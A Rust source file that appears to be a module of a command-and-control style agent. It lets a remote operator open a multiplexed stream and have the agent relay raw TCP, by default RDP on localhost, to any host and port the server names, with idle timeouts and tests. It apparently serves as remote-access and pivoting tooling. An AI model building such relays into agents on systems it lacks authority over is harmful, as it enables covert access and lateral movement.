//! Yamux DESKTOP (0x0D) thin bridge — **RDP port-forward**, module-gated.
//!
//! Product flow:
//! 1. Operator stages+loads L2 `desktop` from Module panel
//! 2. Server opens Yamux type DESKTOP, sends `[host_len][host][port_be]`
//! 3. This bridge dials agent-side target (default 127.0.0.1:3389) and pipes bytes
//!
//! Stage0 does **not** embed GDI/JPEG capture. Capability is opt-in via L2 module.

use std::time::Duration;
use tokio::io::{AsyncReadExt as TokioRead, AsyncWriteExt as TokioWrite};
use tokio::net::TcpStream;
use tokio_util::compat::FuturesAsyncReadCompatExt;
use yamux::Stream;

/// Handle inbound Yamux stream already typed as DESKTOP (0x0D).
/// Failures close **only this stream** — agent process stays alive.
pub async fn handle_stream(stream: Stream) {
    #[cfg(feature = "module-loader")]
    {
        if !crate::module_loader::desktop_module_ready() {
            crate::utils::db_print(
                "[desktop_bridge] module 'desktop' not loaded — reject (load from Module panel)",
            );
            // Consume optional target frame then NACK so server surfaces a clear error.
            let mut s = stream.compat();
            let _ = read_target_skip(&mut s).await;
            let _ = s.write_all(&[0x00]).await;
            return;
        }
        crate::utils::db_print("[desktop_bridge] desktop module loaded — RDP relay");
        run_rdp_relay(stream).await;
        return;
    }

    #[cfg(not(feature = "module-loader"))]
    {
        crate::utils::db_print("[desktop_bridge] no module-loader in this profile");
        let mut s = stream.compat();
        let _ = read_target_skip(&mut s).await;
        let _ = s.write_all(&[0x00]).await;
    }
}

/// Idle window with no bytes either direction → close relay (DoS / orphan guard).
const RELAY_IDLE_SECS: u64 = 120;

/// Protocol (after type byte consumed by dispatcher):
/// Server → Agent: [host_len u8][host bytes][port u16 BE]
/// Agent → Server: 0x01 success | 0x00 fail
/// then raw bidirectional TCP pipe (RDP).
async fn run_rdp_relay(stream: Stream) {
    let mut stream_compat = stream.compat();

    let (host, port) = match read_target(&mut stream_compat).await {
        Ok(v) => v,
        Err(e) => {
            crate::utils::db_print(&format!("[desktop_bridge] bad target: {e}"));
            let _ = stream_compat.write_all(&[0x00]).await;
            return;
        }
    };

    let target = format!("{host}:{port}");
    crate::utils::db_print(&format!("[desktop_bridge] dial {target}"));

    let target_stream = match connect_target(&target).await {
        Ok(s) => s,
        Err(_) => {
            let _ = stream_compat.write_all(&[0x00]).await;
            return;
        }
    };

    if stream_compat.write_all(&[0x01]).await.is_err() {
        return;
    }

    let (mut y_r, mut y_w) = tokio::io::split(stream_compat);
    let (mut t_r, mut t_w) = target_stream.into_split();
    let idle = Duration::from_secs(RELAY_IDLE_SECS);

    let c2t = async {
        let _ = copy_with_idle(&mut y_r, &mut t_w, idle).await;
    };
    let t2c = async {
        let _ = copy_with_idle(&mut t_r, &mut y_w, idle).await;
    };
    tokio::join!(c2t, t2c);
    crate::utils::db_print(&format!("[desktop_bridge] relay closed {target}"));
}

/// Bidirectional half-copy with per-read idle timeout. Any successful read
/// resets the idle window; 120s with no data ends the relay half.
async fn copy_with_idle<R, W>(
    reader: &mut R,
    writer: &mut W,
    idle: Duration,
) -> std::io::Result<u64>
where
    R: TokioRead + Unpin,
    W: TokioWrite + Unpin,
{
    let mut buf = [0u8; 16 * 1024];
    let mut total = 0u64;
    loop {
        let n = match tokio::time::timeout(idle, reader.read(&mut buf)).await {
            Ok(Ok(0)) => return Ok(total),
            Ok(Ok(n)) => n,
            Ok(Err(e)) => return Err(e),
            Err(_) => {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::TimedOut,
                    "desktop relay idle timeout",
                ));
            }
        };
        writer.write_all(&buf[..n]).await?;
        writer.flush().await?;
        total += n as u64;
    }
}

async fn read_target<S: TokioRead + Unpin>(s: &mut S) -> Result<(String, u16), &'static str> {
    let mut len_buf = [0u8; 1];
    s.read_exact(&mut len_buf).await.map_err(|_| "host_len")?;
    let host_len = len_buf[0] as usize;
    if host_len == 0 || host_len > 255 {
        return Err("invalid host_len");
    }
    let mut host_buf = vec![0u8; host_len];
    s.read_exact(&mut host_buf).await.map_err(|_| "host")?;
    let host = String::from_utf8_lossy(&host_buf).into_owned();
    let mut port_buf = [0u8; 2];
    s.read_exact(&mut port_buf).await.map_err(|_| "port")?;
    let port = u16::from_be_bytes(port_buf);
    Ok((host, port))
}

/// Best-effort drain of target header when rejecting early.
async fn read_target_skip<S: TokioRead + Unpin>(s: &mut S) {
    let mut len_buf = [0u8; 1];
    if s.read_exact(&mut len_buf).await.is_err() {
        return;
    }
    let n = len_buf[0] as usize;
    if n == 0 || n > 255 {
        return;
    }
    let mut buf = vec![0u8; n + 2];
    let _ = s.read_exact(&mut buf).await;
}

async fn connect_target(addr: &str) -> Result<TcpStream, ()> {
    match tokio::time::timeout(Duration::from_secs(15), TcpStream::connect(addr)).await {
        Ok(Ok(s)) => {
            let _ = s.set_nodelay(true);
            Ok(s)
        }
        Ok(Err(e)) => {
            crate::utils::db_print(&format!("[desktop_bridge] connect {addr}: {e}"));
            Err(())
        }
        Err(_) => {
            crate::utils::db_print(&format!("[desktop_bridge] connect timeout {addr}"));
            Err(())
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::io::duplex;

    #[tokio::test]
    async fn copy_with_idle_times_out_without_data() {
        let (mut client, mut server) = duplex(64);
        // Reader side never gets data → idle timeout
        let idle = Duration::from_millis(50);
        let result = copy_with_idle(&mut server, &mut client, idle).await;
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert_eq!(err.kind(), std::io::ErrorKind::TimedOut);
    }

    #[tokio::test]
    async fn copy_with_idle_forwards_bytes() {
        // duplex ends are opposite sides of the pipe: write to `src_w`, read from `src_r`.
        let (mut src_w, mut src_r) = duplex(1024);
        let (mut dst_w, mut dst_r) = duplex(1024);
        let idle = Duration::from_secs(2);
        let send = tokio::spawn(async move {
            src_w.write_all(b"rdp-frame").await.unwrap();
            // Half-close write so the reader sees EOF after the payload.
            drop(src_w);
        });
        let n = copy_with_idle(&mut src_r, &mut dst_w, idle)
            .await
            .expect("copy");
        assert_eq!(n, 9);
        send.await.unwrap();
        let mut got = vec![0u8; 9];
        dst_r.read_exact(&mut got).await.unwrap();
        assert_eq!(&got, b"rdp-frame");
    }

    #[test]
    fn relay_idle_is_120s() {
        assert_eq!(RELAY_IDLE_SECS, 120);
    }
}
